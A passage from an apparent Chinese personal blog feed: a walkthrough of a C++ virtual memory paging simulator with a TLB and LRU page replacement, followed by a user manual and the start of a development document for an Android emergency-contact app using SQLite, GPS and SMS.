      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    操作系统大作业的三种语言实现，代码已开源至<a href="https://github.com/Kali-Hac/-C-python-node.js-" target="_blank" rel="external">ttps://github.com/Kali-Hac/-C-python-node.js-</a><br>    本博文只针对于C++版本的代码进行解析<br><a id="more"></a><p></p>
<h2 id="程序目标"><a href="#程序目标" class="headerlink" title="程序目标"></a>程序目标</h2><ul>
<li>实现虚拟内存的分页系统，模拟进程调度过程中的内存管理。<h3 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h3></li>
<li><p>a)假设系统中有 5 个进程同时运行。每个进程的虚拟地址为 32-bit virtual address，虚拟页面大小为 8KB。每个进程的大小分别为 1MB，32MB，64MB，128MB，和 256MB，并且每个进程一半数据占据低位的虚拟地址空间，一半占据高位的虚拟地址空间。如进程 1 数据分布 的 虚 拟 地 址 范 围 为 0x00000000~0x0007FFFF 以 及0xFFFF8000~0xFFFFFFFF。</p>
</li>
<li><p>b)物理内存大小为 64MB，并同样划分成大小为 8KB 的页框。</p>
</li>
<li><p>c)利用带旁路缓冲 TLB 的分页系统实现虚拟页面到物理页的映射，如下图 1 所示。TLB 包含 16 个 entry，用来保存当前进程在运行过程中最近被访问的 16 个虚拟页面到物理页面的映射。每一个进程的 page table 大小由其虚拟地址空间对应的页面数量决定。</p>
</li>
</ul>
<h3 id="系统实现"><a href="#系统实现" class="headerlink" title="系统实现"></a>系统实现</h3><ul>
<li>a)五个进程轮流执行，总共执行三轮。</li>
</ul>
<p>每个进程在第一次执行时，页表内容为空，每次执行完毕出现进程切换时，将其页表内容保存到外部文件。在该程序之后执行时，首先从外部文件导入页表内容。</p>
<p>TLB 用来保存当前运行进程最近的页访问信息，因此在进程切换时，需要清空 TLB 为新进程的运行做准备。</p>
<ul>
<li>b)每个进程在一次执行过程中，利用随机函数生成 500 次虚拟地址的访问序列。例如，进程 1 在执行过程中，生成 500 个随机虚拟地址访问序列，每个虚拟地址均需落在 0x00000000~0x0007FFFF 或者 0xFFFF8000~0xFFFFFFFF 范围内。</li>
</ul>
<p>生成随机虚拟地址序列的方式为：首先随机生成一个地址，然后以该</p>
<p>地址为起始点生成九个连续的地址。按此方法循环 50 次，总共生成 500 次随机虚拟地址访问。</p>
<ul>
<li>c)若访问某个虚拟地址，首先生成对应的虚拟页号（ virtual page number），再查找该虚拟页对应的物理页框号（page frame number）</li>
</ul>
<p>是否在 TLB；若不在 TLB，进一步查找是否在 page table；若也不在，则分配一个物理页框给该页面，并将虚拟页到物理页的映射信息保</p>
<p>存在 page table 和 TLB 中。</p>
<p>若 TLB 已满，按照 LRU 的置换策略置换掉最早被访问的 entry。</p>
<ul>
<li>d)物理页面在分配的过程中，若仍然有可用的页框，按照页框编号从小到大依次分配。若没有可用页框，则利用 LRU 置换策略，将最早分配的页框收回重新分配给当前的虚拟页。被收回的页框若是已经分配给其他进程，则需要更新该进程的 page table。</li>
</ul>
<h3 id="系统输出"><a href="#系统输出" class="headerlink" title="系统输出"></a>系统输出</h3><ul>
<li><p>a)将每个进程 i 的 1500 次随机虚拟地址访问序列输出保存在文件 addr_seq_i.txt 中;</p>
</li>
<li><p>b)将每个进程 i 的 1500 次访问信息输出保存在 visit_seq_i.txt 中；</p>
</li>
</ul>
<p>一次访问对应信息如下：</p>
<p>VP number  PF number    TLB hit/no hit    PT hit/no hit；</p>
<p>并计算该进程在这三轮执行过程中的页缺失率（page fault rate），输出。</p>
<ul>
<li>c)将每个进程 i 最后一次运行结束后 的 page table 保存在 page_table_i.txt 文件中；<br><img src="http://op72m4y17.bkt.clouddn.com/OS1.png" alt="虚拟内存的分页系统图"><h2 id="数据结构以及符号说明"><a href="#数据结构以及符号说明" class="headerlink" title="数据结构以及符号说明"></a>数据结构以及符号说明</h2><blockquote>
<p>一共由三个类头文件和一个主运行文件组成<br>分别是process.h、TLB.h、page_table.h、源.cpp<br>顾名思义，process.h封装了进程寻址和运行过程(包括载入TLB、对比并更新page_table、搜寻并载入系统页框、输出访问结果、保存系统TLB)<br>TLB.h封装了TLB表及其寻页功能<br>page_table.h封装了页表及其寻页功能<br>源.cpp追求简洁，包括申请不同内存的进程对象，进行赋数量值寻址和打印不同进程的页表。</p>
<h3 id="符号说明："><a href="#符号说明：" class="headerlink" title="符号说明："></a>符号说明：</h3><figure class="highlight plain"><figcaption><span>int MB;//构造函数中使用MB，带入更易理解</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">typedef long long ll;//代码中用ll简化long long</div><div class="line">#define TLB_miss -1 //return TLB_miss代表miss</div><div class="line">#define p_table_miss -1//同上，为方便代码理解</div><div class="line">#define mb (ll)pow(2,20) </div><div class="line">//在代码中可直接使用mb代表2^20</div><div class="line">//内联函数移位，可以用于地址的快速切分(页地址+偏移量)</div><div class="line">inline ll move_bits(ll ori,int bits) &#123;</div><div class="line">	while (ori &gt; 0&amp;&amp;bits&gt;0) &#123;</div><div class="line">		ori /= 2;</div><div class="line">		bits--;</div><div class="line">	&#125;</div><div class="line">	return ori;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>各类的成员变量如下：</p>
<blockquote>
<p>1.process：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">private:</div><div class="line">	int run_time;//进程运行的次数</div><div class="line">	int process_No;//进程编号</div><div class="line">	MB size;//记录进程所占内存大小</div><div class="line">	ll high_addr[2];</div><div class="line">	//addr[0]为起始地址，addr[1]为末端地址</div><div class="line">	ll low_addr[2];</div><div class="line">	ll access_addrs[5001];//每次随机访问的5000地址数组</div><div class="line">	static int process_id;//随进程数增加而增加</div><div class="line">	int owned_p_page[8192];</div><div class="line">	//独自储存的本进程页框使用情况，用于对比、更新被回收的页框及自身的页表</div><div class="line">	int page_fault;//缺页记录</div><div class="line">	int access_times;//地址访问总次数记录</div><div class="line">	int tlb_miss;//TLB的miss记录</div><div class="line">&#125;;</div><div class="line">//静态全局变量记录已开的进程数</div><div class="line">int process::process_id = 0;</div><div class="line">TLB process::tlb = TLB(16);</div><div class="line">//共用TLB并初始化</div></pre></td></tr></table></figure></p>
<p>2.page_table:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">public:</div><div class="line">static int physical_pframes[8192];//用于记录物理内存页框是否存入页表，且进行进程占用标记</div><div class="line">	static int LRU_flag;//用于标记最先分配出去的页框</div><div class="line">	int first_page[64];//判断一级页面是否已载入</div><div class="line">	//此处二级页表不考虑页面权限位的占用,若要考虑则可减少设定为4096</div><div class="line">	ll **p_table = new ll*[64];//对应二级页表结构，页目录(外层页号)有64个，每个页表项(外层页内地址)有8192个(对应8k的偏移量)</div><div class="line">private:</div><div class="line">	//ll p_table[524288];//对应一级页表结构</div><div class="line">	//此处二级页表不考虑页面权限位的占用,若要考虑则可减少设定为4096</div><div class="line">	int v_page_seek;//搜寻使用页框标记</div><div class="line">	ll v_p_reflect[2];//每次寻页的记录</div></pre></td></tr></table></figure></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">3.TLB:</div><div class="line">private:</div><div class="line">	ll TLB_v_pages[16];//16个虚页</div><div class="line">	ll TLB_p_pages[16];//对应16个实页框</div><div class="line">	ll LRU_order[16];//记录存放顺序，可不用</div><div class="line">	int size;</div></pre></td></tr></table></figure>
<h3 id="各类成员函数："><a href="#各类成员函数：" class="headerlink" title="各类成员函数："></a>各类成员函数：</h3><p>(详细用途请看代码里注释)<br><img src="http://op72m4y17.bkt.clouddn.com/OS2.png" alt="类的函数"></p>
<h2 id="程序流程图及流程分析"><a href="#程序流程图及流程分析" class="headerlink" title="程序流程图及流程分析"></a>程序流程图及流程分析</h2><p>(以下取main函数进行流程分析)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">int main(int argc,char *argv[]) &#123;</div><div class="line">//开进程，以MB为单位，可见process</div><div class="line">//构造函数</div><div class="line">	process p1(1);</div><div class="line">	process p2(32);</div><div class="line">	process p3(64);</div><div class="line">	process p4(128);</div><div class="line">	process p5(256);</div><div class="line">//再开9个内存为256M的进程用于测试</div><div class="line">	process pp[9] = &#123; 256,256,256,256,256,256,256,256,256&#125;;</div><div class="line">//.......中间有地址范围的输出，详看源代码</div><div class="line">	int cnt = 20;//运行20个回合</div><div class="line">	while (cnt--) &#123;</div><div class="line">		p1.get_access_addrs(5000);//获取//5000个随机访问地址</div><div class="line">		p1.run();//运行</div><div class="line">		//run的过程包括载入TLB、对比并更新page_table、搜寻并载入系统页框、输出访问结果、保存系统TLB</div><div class="line">		//所有过程封装至类process里</div><div class="line">		p2.get_access_addrs(5000);</div><div class="line">		p2.run();</div><div class="line">		p3.get_access_addrs(5000);</div><div class="line">		p3.run();</div><div class="line">		p4.get_access_addrs(5000);</div><div class="line">		p4.run();</div><div class="line">		p5.get_access_addrs(5000);</div><div class="line">		p5.run();</div><div class="line">	for (int i = 0; i &lt; 9; i++) &#123;</div><div class="line">			pp[i].get_access_addrs(5000);</div><div class="line">			pp[i].run();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	//输出每个进程对应的页表</div><div class="line">	p1.print_page_table();</div><div class="line">	p2.print_page_table();</div><div class="line">	p3.print_page_table();</div><div class="line">	p4.print_page_table();</div><div class="line">	p5.print_page_table();</div><div class="line">	for (int i = 0; i &lt; 9; i++) &#123;</div><div class="line">		pp[i].print_page_table();</div><div class="line">	&#125;</div><div class="line">system(&quot;pause&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="程序逻辑运行流程"><a href="#程序逻辑运行流程" class="headerlink" title="程序逻辑运行流程"></a>程序逻辑运行流程</h2><blockquote>
<p>1.开进程<br>2.计算得到数据所在地址范围<br>3.获取一定数量的随机地址<br>4.切分得到页地址和页內偏移量<br>5.页地址再切分得到一级地址和二级地址(也就是一级外页的偏移量)<br>6.首先在TLB表中寻找<br>6-a若存在则按照LRU策略把最新用到的页表项放到第一位，其他往后移。成功返回寻到的地址，寻址结束。<br>6-b若不存在，则进行下一步的寻页<br>7.在寻页前首先更新该进程的页表<br>(与自身存储的页框使用表进行对比，看是否原先的页框已被其他进程占用，若是这样则把对应的虚页设为-1初始化)<br>8.开始寻页，判断一级页表是否已载入:<br>PS（程序中首先开<br>ll <em>*p_table = new ll</em>[64];<br>//对应二级页表结构，页目录(外层页号)有64个，每个页表项(外层页内地址)有8192个(对应8k的偏移量)）<br>然后再根据程序需要开二级页表，这样可以离散化利用页表而不需要过早申请过多的无用的页表空间)<br>8-a载入的话在一级页面的页面数组中看二级页面是否已存该虚拟地址的实页地址，若有则成功返回，若没有则分配可用页框给它<br>8-b若一级页表还未载入的话，<br>p_table[first_p] = new ll[8192];<br>        for (int i = 0; i &lt; 8192; i++)<br>            p_table[first_p][i] = -1;<br>为一级页表申请内存空间(即构造二级页表)，并出初始化为-1(还未分配页框)<br>然后分配可用页框给这个页表项<br>(8-a)∩(8-b)这两个过程<br>若可用页框已分配完，则分配最早分配的页框给该进程并输出具体进程和页框(在输出文件visit_seq_i.txt里)，然后更新那个进程的页表<br>（具体实现过程请看过程7和代码）<br>9成功分配一个可用页框给该虚拟地址，并存入页表和TLB（按照LRU策略放在最前面），返回TLB_miss或page_fault或两者，将分配的页框存于公共可访问变量v_p_reflect[1]，而v_p_reflect[0]存放对应的虚拟地址。<br>10.记录TLB_miss和page_fault,进行缺页率的计算并输出文件，寻页过程结束。</p>
</blockquote>
<h2 id="程序运行时的参数置以及运行结果说明"><a href="#程序运行时的参数置以及运行结果说明" class="headerlink" title="程序运行时的参数置以及运行结果说明"></a>程序运行时的参数置以及运行结果说明</h2><blockquote>
<p>(本代码不采用命令行参数(配合gcc编译生成exe文件使用)，所有参数直接在源.cpp代码文件里面进行设置，原因是代码文件由注释和参数非常直观，可以直接设置，具体请看上面四、程序流程分析)<br>(下面截图)运行参数：<br>1.进程数:14(1M 32M 64M 128M 256M 256M<em>9)<br>2.可用页框page_frames数：8192(设置为2500可以让页表LRU回收效果更显著，<br>具体可看2500可用页框 15进程数的输出结果！<br>3.运行轮回：20轮(15进程轮流<br>4.每次随机地址访问数:5000(有设置不同内存的进程的special因子，增强随机效果，但原规则依旧是大作业要求里面的规则<br>详细注释请看源代码<br>process.h<br>page_table.h<br>源.cpp<br>TLB.h<br>注意事项：<br>进程数再加1(1M 32M 64M 128M 256M 256M</em>10)就会发生系统栈溢出，具体错误说明如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">; Find next lower page and probe</div><div class="line">cs20:</div><div class="line">        sub     eax, _PAGESIZE_         ; decrease by PAGESIZE</div><div class="line">        test    dword ptr [eax],eax     ; probe page.</div><div class="line">        jmp     short cs10</div><div class="line"></div><div class="line">overflow出现中断在test这一行，显示参数错误</div><div class="line">前一行sub应该是为变量开辟栈空间，我们知道函数参数是从逆序入栈的，而函数变量申请空间也是从高地址减去相应空间地址开始存储的，例如开char[100]则esp会从函数基址减去100个地址开始存放数据。</div><div class="line">经过测试，开1M 32M 64M 128M 256M 256M*9 这14个进程不会报错不会溢出，而开1M 32M 64M 128M 256M 256M*10则发送溢出错误，可初步说明这是由于栈内存空间不足而引发的溢出。</div><div class="line">系统的错误说明----函数参数发生错误，这一点从缓冲区溢出漏洞也可以得到启示，当栈空间不足时，申请的溢出地址会覆盖函数基址，即参数(的地址)，所以综上所述，的确是由于内存空间不足发生的错误，而并非是代码逻辑错误。</div></pre></td></tr></table></figure></p>
</blockquote>
<p>附截图(控制台只显示各进程的地址访问范围，实际内容请看输出文件</p>
<h3 id="控制台输出截图如下："><a href="#控制台输出截图如下：" class="headerlink" title="控制台输出截图如下："></a>控制台输出截图如下：</h3><p><img src="http://op72m4y17.bkt.clouddn.com/OS3.png" alt="C++运行截图(前)"><br><img src="http://op72m4y17.bkt.clouddn.com/OS4.png" alt="C++运行截图(后)"></p>
<h3 id="输出结果截图如下："><a href="#输出结果截图如下：" class="headerlink" title="输出结果截图如下："></a>输出结果截图如下：</h3><blockquote>
<p>(十六进制的虚页地址将页內偏移地址切分出来再转换为十进制，页框也是用十进制表示)<br>(截取至page_table_14.txt)<br><img src="http://op72m4y17.bkt.clouddn.com/OS5.png" alt="页表输出"><br>(截取至visit_seq_14.txt)<br><img src="http://op72m4y17.bkt.clouddn.com/OS6.png" alt="访问地址输出"><br>(这里由于页框数比较多，所以回收基本是在进程1回收，如果要看比较明显的回收效果，请看2500页框15进程的那个输出文件</p>
<h2 id="程序设计重的重点分析"><a href="#程序设计重的重点分析" class="headerlink" title="程序设计重的重点分析"></a>程序设计重的重点分析</h2><p><img src="http://op72m4y17.bkt.clouddn.com/OS11.png" alt="设计重难点"><br><img src="http://op72m4y17.bkt.clouddn.com/OS12.png" alt="1-2-3"><br><img src="http://op72m4y17.bkt.clouddn.com/OS13.png" alt="4-5"><br><img src="http://op72m4y17.bkt.clouddn.com/OS14.png" alt="6"><br><img src="http://op72m4y17.bkt.clouddn.com/OS15.png" alt="7-8"><br><img src="http://op72m4y17.bkt.clouddn.com/OS16.png" alt="9"></p>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p><img src="http://op72m4y17.bkt.clouddn.com/OS17.png" alt="python主代码截图"></p>
<h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><p><img src="http://op72m4y17.bkt.clouddn.com/OS18.png" alt="node.js随机访问地址输出"></p>
</blockquote>
<h2 id="python-js运行说明"><a href="#python-js运行说明" class="headerlink" title="python/js运行说明"></a>python/js运行说明</h2><p><img src="http://op72m4y17.bkt.clouddn.com/OS19.png" alt="python运行环境说明"><br><img src="http://op72m4y17.bkt.clouddn.com/OS20.png" alt="Node.js运行环境说明"></p>
<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 作者:Hac </category>
            
            <category> C++、python和node.js代码的重构与实现 </category>
            
            <category> 面向对象编程设计 </category>
            
            <category> 虚拟内存存储器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 脚本语言的面向对象设计 </tag>
            
            <tag> 多级页表 </tag>
            
            <tag> 旁带缓冲TLB表 </tag>
            
            <tag> 页框LRU回收机制 </tag>
            
            <tag> 多进程模拟 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(V3.0)基于AndroidSQLite和传感器的创意app(下)]]></title>
      <url>http://yikunhaocong.com/2017/06/27/appV3-0/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>app项目地址</strong>：<a href="https://github.com/Kali-Hac/Hac_app" target="_blank" rel="external">https://github.com/Kali-Hac/Hac_app</a><br>    本篇博文是AppV3.0版本更新后的用户手册，新增加了不少实用的功能&amp;更友好的界面，更方便用户的使用，往后还会继续更新。<br><a id="more"></a><p></p>
<h2 id="1-基本功能使用"><a href="#1-基本功能使用" class="headerlink" title="1.基本功能使用"></a>1.基本功能使用</h2><h3 id="1-1开启app页面-停留5s-√"><a href="#1-1开启app页面-停留5s-√" class="headerlink" title="1-1开启app页面(停留5s) √"></a>1-1开启app页面(停留5s) √</h3><p><img src="http://op72m4y17.bkt.clouddn.com/31.png" alt=""></p>
<ul>
<li>新加界面显示各种信息的功能</li>
<li>新加自动保存个人定位(附加地址)信息</li>
<li>新加设置是否“摇一摇定位”&amp;延时发送<br><img src="http://op72m4y17.bkt.clouddn.com/3.2.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/3.3.png" alt=""><h3 id="1-1主页面展示，带加速度检测-包括联系人、紧急联系人、健康-运动备忘录、设置信息-√"><a href="#1-1主页面展示，带加速度检测-包括联系人、紧急联系人、健康-运动备忘录、设置信息-√" class="headerlink" title="1-1主页面展示，带加速度检测(包括联系人、紧急联系人、健康/运动备忘录、设置信息) √"></a>1-1主页面展示，带加速度检测(包括联系人、紧急联系人、健康/运动备忘录、设置信息) √</h3></li>
<li>(可以自己设置用户信息并展示在首页，只需轻轻点击左边头像即可自动保存)<br><img src="http://op72m4y17.bkt.clouddn.com/3.4.png" alt=""></li>
<li>(点击右边头像进入用户帮助)<br><img src="http://op72m4y17.bkt.clouddn.com/3.5.png" alt=""><h3 id="1-2-紧急联系人通讯录增删改查√"><a href="#1-2-紧急联系人通讯录增删改查√" class="headerlink" title="1-2 紧急联系人通讯录增删改查√"></a>1-2 紧急联系人通讯录增删改查√</h3><img src="http://op72m4y17.bkt.clouddn.com/3.6.png" alt=""></li>
<li>新增用户帮助按钮<blockquote>
<p>查看已有联系人<br><img src="http://op72m4y17.bkt.clouddn.com/3.7.png" alt=""><br>增加联系人<br><img src="http://op72m4y17.bkt.clouddn.com/3.8.png" alt=""><br>通过“否”设置查询<br><img src="http://op72m4y17.bkt.clouddn.com/3.9.png" alt=""><br>通过名字“小葱”查询<br><img src="http://op72m4y17.bkt.clouddn.com/4.0.png" alt=""></p>
</blockquote>
</li>
</ul>
<p>通过id号删除联系人<br><img src="http://op72m4y17.bkt.clouddn.com/4.1.png" alt=""></p>
<blockquote>
<p>“XXX”已被成功删除<br><img src="http://op72m4y17.bkt.clouddn.com/4.2.png" alt=""></p>
</blockquote>
<h3 id="1-3-备忘录的增删改查-包括界面友好的提示-√新增用户帮助-amp-自定义时间"><a href="#1-3-备忘录的增删改查-包括界面友好的提示-√新增用户帮助-amp-自定义时间" class="headerlink" title="1-3 备忘录的增删改查(包括界面友好的提示)√新增用户帮助&amp;自定义时间"></a>1-3 备忘录的增删改查(包括界面友好的提示)√新增用户帮助&amp;自定义时间</h3><p><img src="http://op72m4y17.bkt.clouddn.com/4.3.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/4.4.png" alt=""></p>
<blockquote>
<p>通过ID号获取<br><img src="http://op72m4y17.bkt.clouddn.com/4.5.png" alt=""><br>删除备忘录<br><img src="http://op72m4y17.bkt.clouddn.com/4.6.png" alt=""></p>
<p>已成功删除<br><img src="http://op72m4y17.bkt.clouddn.com/4.7.png" alt=""><br>添加备忘录<br><img src="http://op72m4y17.bkt.clouddn.com/4.8.png" alt=""><br>设置时间提醒<br><img src="http://op72m4y17.bkt.clouddn.com/4.9.png" alt=""></p>
<h3 id="1-4-高德地图定位系统以及紧急短信收发√新增用户帮助-amp-灵敏度设置"><a href="#1-4-高德地图定位系统以及紧急短信收发√新增用户帮助-amp-灵敏度设置" class="headerlink" title="1-4 高德地图定位系统以及紧急短信收发√新增用户帮助&amp;灵敏度设置"></a>1-4 高德地图定位系统以及紧急短信收发√新增用户帮助&amp;灵敏度设置</h3><p><img src="http://op72m4y17.bkt.clouddn.com/5.0.png" alt=""><br>进入定位系统初始化界面<br><img src="http://op72m4y17.bkt.clouddn.com/5.1.png" alt=""><br>提示是否确认通知<br><img src="http://op72m4y17.bkt.clouddn.com/5.2.png" alt=""><br>自动定位后获取地址(打开定位默认为需要紧急联系，在其它界面中只要手机超过加速度阈值就会自动定位)<br><img src="http://op72m4y17.bkt.clouddn.com/5.3.png" alt=""></p>
</blockquote>
<h2 id="2-拓展功能使用"><a href="#2-拓展功能使用" class="headerlink" title="2.拓展功能使用"></a>2.拓展功能使用</h2><ul>
<li>可以设置摇一摇灵敏度</li>
<li>可以随时群发消息</li>
<li>可以添加附加的更准确的定位信息</li>
<li>可以设置是否“延时发送”</li>
<li>可以设置是否“摇一摇”发送定位信息</li>
</ul>
<blockquote>
<p>设置为紧急联系人后的确认</p>
<ul>
<li>(实际效果图还有加上附加的地址信息)<br><img src="http://op72m4y17.bkt.clouddn.com/5.4.png" alt=""></li>
</ul>
<p>本安卓项目已开源到<strong>我的github上</strong>：<a href="https://github.com/Kali-Hac/Hac_app" target="_blank" rel="external">https://github.com/Kali-Hac/Hac_app</a> (暂时为测试偏稳定版本，可能会有一些bug或不尽人意之处，将会不断更新)，另，各位小伙伴有任何问题可以在下方留言，我会及时解答或订正<br><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 作者:Hac </category>
            
            <category> Android实战笔记 </category>
            
            <category> 一个人的数据库实训 </category>
            
            <category> 多线程子模块的应用 </category>
            
            <category> 安卓传感器的应用 </category>
            
            <category> 高德地图定位 </category>
            
            <category> 创意小app </category>
            
            <category> V3.0更新版本新特性简介 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> AndroidSQLite简单应用 </tag>
            
            <tag> 安卓传感器的运用 </tag>
            
            <tag> GPS定位 </tag>
            
            <tag> 线性加速度传感器 </tag>
            
            <tag> SMS功能 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(V3.0)基于AndroidSQLite和传感器的创意app(上)]]></title>
      <url>http://yikunhaocong.com/2017/06/19/app/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    本博文仅为对安卓开发感兴趣的小伙伴们提供经验，这是自己数据库实训的开发文档之一(测试报告&amp;代码编写)，此外还有用户使用手册和实训总结以及各类设计说明书可能会在后续更新，安卓项目将会开源至我的github上。<br><a id="more"></a><br><img src="http://op72m4y17.bkt.clouddn.com/app32.png" alt="app界面"><br>1.Android项目总览<br>1-1子模块代码结构&amp;功能简介：<br>1-1-1: cmlibrary子模块<br>1-1-2: doublescroll子模块<br>1-1-3: lovelyprogressbar子模块(这个就没有什么好讲的了，主要用于加载的动画效果)<br>1-2主模块代码结构&amp;功能简介：<br>1-2-2主模块layout结构&amp;界面简介：<br>2.Android代码测试<br>2-1开启app页面(停留5s) √<br>2-1主页面展示，带加速度检测(包括联系人、紧急联系人、健康/运动备忘录、设置信息) √<br>2-2 紧急联系人通讯录增删改查√<br>2-3 备忘录的增删改查(包括界面友好的提示)√<br>2-4 高德地图定位系统以及紧急短信收发(加速度阈值设定)√<br>(重要)3.Android数据库构建<p></p>
<p>(首页开始)</p>
<h1 id="1-Android项目总览"><a href="#1-Android项目总览" class="headerlink" title="1.Android项目总览"></a>1.Android项目总览</h1><p><img src="http://op72m4y17.bkt.clouddn.com/app1.png" alt=""><br>(其中bwl_uiii子模块未嵌入使用)</p>
<h2 id="1-1子模块代码结构-amp-功能简介："><a href="#1-1子模块代码结构-amp-功能简介：" class="headerlink" title="1-1子模块代码结构&amp;功能简介："></a>1-1子模块代码结构&amp;功能简介：</h2><p><img src="http://op72m4y17.bkt.clouddn.com/app2.png" alt=""></p>
<h3 id="1-1-1-cmlibrary子模块"><a href="#1-1-1-cmlibrary子模块" class="headerlink" title="1-1-1: cmlibrary子模块"></a>1-1-1: cmlibrary子模块</h3><ul>
<li><p>①CircleMenu用于菜单的结构构建<br><img src="http://op72m4y17.bkt.clouddn.com/app3.png" alt=""></p>
</li>
<li><p>②OnMenuSelectedListener用于菜单的点击监听<br><img src="http://op72m4y17.bkt.clouddn.com/app4.png" alt=""></p>
</li>
<li>③OnMenuSelectedListener用于菜单的选择监听<br><img src="http://op72m4y17.bkt.clouddn.com/app5.png" alt=""><br>(点击后会有旋转效果<h3 id="1-1-2-doublescroll子模块（该模块是github的开源模块，自己重写了主要功能用于展示）"><a href="#1-1-2-doublescroll子模块（该模块是github的开源模块，自己重写了主要功能用于展示）" class="headerlink" title="1-1-2: doublescroll子模块（该模块是github的开源模块，自己重写了主要功能用于展示）"></a>1-1-2: doublescroll子模块（该模块是github的开源模块，自己重写了主要功能用于展示）</h3><img src="http://op72m4y17.bkt.clouddn.com/app6.png" alt=""><br>原效果如下：<br><img src="http://op72m4y17.bkt.clouddn.com/app7.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app8.png" alt=""></li>
<li>①我改写了其中的Fragment1,Fragment2,Fragment3,Fragment4,FragmentSina的代码<br>这5个java文件是下面列表内容的填写，我自己添加了数据库读取和展示，效果如下：<br><img src="http://op72m4y17.bkt.clouddn.com/app9.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app10.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app11.png" alt=""></li>
<li>②当然，还改写了主文件Home.java(此处是我自己命名)还有设置各个fragment的SAdapter.java文件<h3 id="1-1-3-lovelyprogressbar子模块-这个就没有什么好讲的了，主要用于加载的动画效果"><a href="#1-1-3-lovelyprogressbar子模块-这个就没有什么好讲的了，主要用于加载的动画效果" class="headerlink" title="1-1-3: lovelyprogressbar子模块(这个就没有什么好讲的了，主要用于加载的动画效果)"></a>1-1-3: lovelyprogressbar子模块(这个就没有什么好讲的了，主要用于加载的动画效果)</h3><img src="http://op72m4y17.bkt.clouddn.com/app12.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app13.png" alt=""></li>
</ul>
<h2 id="1-2主模块代码结构-amp-功能简介："><a href="#1-2主模块代码结构-amp-功能简介：" class="headerlink" title="1-2主模块代码结构&amp;功能简介："></a>1-2主模块代码结构&amp;功能简介：</h2><p><img src="http://op72m4y17.bkt.clouddn.com/app14.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app15.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app16.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app17.png" alt=""></p>
<ul>
<li>这几个是用于主页展示的代码<br>(利用子模块doublescroll进行个性化定制改写的代码)</li>
</ul>
